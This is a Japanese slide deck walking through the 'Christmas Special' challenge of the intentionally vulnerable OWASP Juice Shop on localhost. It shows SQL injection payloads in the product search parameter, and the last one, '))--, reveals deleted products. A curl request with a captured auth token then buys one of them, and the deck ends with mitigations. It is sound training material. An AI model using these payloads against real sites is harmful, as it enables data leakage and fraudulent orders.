---
marp: true
footer: "2023/03/20"

---

# SQLインジェクション2 with OWASP juice shop

---

# 今回やること

* Christmas Special

---

# Christmas Special

Order the Christmas special offer of 2014.

過去に販売されていた商品を購入するSQLインジェクションの問題

---

# Christmas Special


1. http://localhost:3000/#/search を開き、ブラウザの DevTools で Network タブを観察しながら F5 でページを再読み込みする。
2. 商品データを返すGETリクエストhttp://localhost:3000/rest/products/search?q= を認識する。
3. 適当にhttp://localhost:3000/rest/products/search?q=orange とかを叩いてみる
   * レスポンス：`{"status":"success","data":[{"id":2,"name":"Orange Juice (1000ml)","description":"Made from oranges hand-picked by Uncle Dittmeyer.","price":2.99,"deluxePrice":2.49,"image":"orange_juice.jpg","createdAt":"2023-03-07 00:01:37.598 +00:00","updatedAt":"2023-03-07 00:01:37.598 +00:00","deletedAt":null}]}`

---
# Christmas Special

4. 500エラーを起こさないか、http://localhost:3000/rest/products/search?q='; で叩いてみる
5. `SQLITE_ERROR: syntax error`が記載されたエラーページが表示され、SQL Injectionが実際に可能であることがわかる。
6. `q='--` に変化させると、`SQLITE_ERROR: incomplete input` となる。このエラーは、クエリに2つの括弧があるために起こる。
7. `q='))--`を使うことで構文が修正され、論理削除されたChristmas special offerを含む全商品を正常に取得できる。そのid（10）をメモしておく。

---
# Christmas Special

8. http://localhost:3000/#/login にアクセスし、適当なユーザーでログインする。
9. 商品ページで適当な商品をかごに追加し、Networkタブを表示してhttp://localhost:3000/api/BasketItems でPOSTリクエストを送っていることを確認する。このとき、ペイロードは`{ProductId: 1, BasketId: "6", quantity: 1}`のようなデータ構造になっている。また、ペイロードのBasketId値と、Authorizationヘッダ値を保存しておく。

---

# Christmas Special

10. http://localhost:3000/api/BasketItems に対してPOSTリクエストを投げ、Christmas special offerを購入する。具体的には以下のようなリクエストを投げる。(ここではlinuxターミナル上でcurlコマンドを利用)authorization headerの値とBasketIdの値は9で調べたものを利用する

```shell
curl -XPOST \
-H "Content-Type:application/json" \
-H "Authorization: <your authorization header>" \
-d '{"ProductId": 10, "BasketId": <your BasketId>, "quantity": 1}' \
http://127.0.0.1:3000/api/BasketItems/
```

11.  http://localhost:3000/#/basket にアクセスして、「Christmas Super-Surprise-Box (2014 Edition)」がカゴに入っていることを確認する。

---

# Christmas Special

12. 「Your Basket」ページの「Checkout」をクリックし、決済を行う。

以上で完了！！

---

# Christmas Special: 考えられる脆弱性

* http://localhost:3000/rest/products/search?q= におけるSQLインジェクションで様々なデータの漏洩
* 論理削除したはずの過去の商品が購入されてしまう。
  
---

# Christmas Special: 原因と対策

* 原因
  * SQLインジェクションに関しては入力パラメータのエスケープ処理が適切にされていないことが考えられる(以前のログインのインジェクションと同様)
  * 論理削除されたはずの過去の商品が購入できてしまう実装になっている(適切なvalidationが出来ていない)
* 対策
  * SQLインジェクションに関してはプリペアードステートメントを利用するなどして、入力パラメータは単なるリテラルとして処理する
  * アプリケーション側のvalidationロジックで論理削除したものは購入処理(カート追加)ができないようにする
